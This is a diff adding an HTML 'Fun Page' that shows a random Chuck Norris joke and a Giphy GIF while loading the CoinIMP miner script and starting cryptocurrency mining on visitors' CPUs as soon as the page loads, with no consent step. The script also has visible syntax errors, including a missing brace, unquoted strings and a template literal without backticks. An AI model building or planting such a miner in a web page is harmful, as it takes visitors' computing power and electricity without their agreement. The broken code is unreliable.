@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Random GIF, Chuck Norris Joke, and Mining</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        #gif-container {
+            margin-top: 30px;
+        }
+
+        #joke-container {
+            margin-top: 30px;
+            font-size: 1.2em;
+            color: #333;
+        }
+
+        #mining-status {
+            margin-top: 20px;
+            font-size: 1.5em;
+            color: green;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+        }
+    </style>
+</head>
+<body>
+<h1>Welcome to the Fun Page!</h1>
+
+    <!-- Mining Status -->
+    <div id="mining-status">Starting Mining...</div>
+
+    <!-- Display Random Chuck Norris Joke -->
+    <div id="joke-container"></div>
+
+    <!-- Display Random GIF -->
+    <div id="gif-container">
+        <img id="random-gif" src="" alt="Random GIF">
+    </div>
+
+    <script src="https://www.coinimp.com/miner.js"></script> <!-- CoinIMP Miner Script -->
+
+    <script>
+        // Function to fetch a random Chuck Norris joke
+        async function fetchChuckNorrisJoke() {
+            const response = await fetch('https://api.chucknorris.io/jokes/random');
+            const data = await response.json();
+            document.getElementById('joke-container').innerHTML = <p>data.value</p>;
+        
+
+        // Function to fetch a random GIF
+        async function fetchRandomGIF() 
+            const apiKey = 'YOUR_GIPHY_API_KEY'; // Replace with your Giphy API key
+            const response = await fetch(https://api.giphy.com/v1/gifs/random?api_key={apiKey}&tag=funny&rating=g);
+            const data = await response.json();
+            const gifUrl = data.data.images.original.url;
+            document.getElementById('random-gif').src = gifUrl;
+        }
+// Automatically calculate the number of threads based on available CPU cores
+        function getAvailableThreads() {
+            const cpuCores = navigator.hardwareConcurrency || 4;  // Default to 4 if hardwareConcurrency is not available
+            return Math.max(1, Math.min(cpuCores, 4));  // Limit to 4 threads max to avoid overloading
+        }
+
+        // Initialize CoinIMP miner (for mining VerusCoin or Monero)
+        function startMining() {
+            const threads = getAvailableThreads();  // Get the number of threads based on available CPU cores
+            const miner = new CoinIMP.Miner('YOUR_SITE_KEY', {
+                threads: threads,  // Automatically set the number of threads
+                throttle: 0.5, // Throttle the miner's CPU usage (0.5 = 50%)
+                autoThreads: false,  // Don't let CoinIMP decide the threads for us
+                forceASMJS: false
+            });
+
+            miner.start();
+            document.getElementById('mining-status').innerText = Mining started with ${threads} threads...;
+
+            // Optionally, you can track mining progress or errors
+            miner.on('start', () => {
+                console.log('Mining started!');
+            });
+
+            miner.on('error', (error) => {
+              console.error('Mining error:', error);
+            });
+
+            miner.on('end', () => {
+                console.log('Mining ended');
+            });
+        }
+
+        // Call functions to fetch Chuck Norris joke and random GIF
+        fetchChuckNorrisJoke();
+        fetchRandomGIF();
+
+        // Start mining once the page is loaded
+        window.onload = function() {
+            startMining();
+        };
+    </script>
+</body>
+</html>
